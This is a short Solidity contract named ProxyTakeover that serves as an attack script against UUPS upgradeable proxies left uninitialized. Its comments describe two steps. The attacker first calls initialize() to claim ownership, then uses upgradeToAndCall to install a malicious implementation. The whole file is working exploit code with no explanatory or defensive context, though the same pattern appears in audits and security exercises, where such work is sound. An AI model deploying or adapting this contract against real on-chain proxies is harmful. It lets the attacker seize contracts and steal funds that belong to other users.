
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IUUPS {
    function initialize(address owner) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function owner() external view returns (address);
}

contract ProxyTakeover {
    IUUPS public proxy;

    constructor(address _proxy) {
        proxy = IUUPS(_proxy);
    }

    // Step 1: if initialize() was never called, attacker claims ownership
    function claimOwnership() external {
        proxy.initialize(address(this));
        require(proxy.owner() == address(this), "already initialized");
    }

    // Step 2: upgrade to a malicious implementation
    function upgrade(address maliciousImpl) external {
        require(proxy.owner() == address(this), "not owner");
        proxy.upgradeToAndCall(maliciousImpl, "");
    }
}
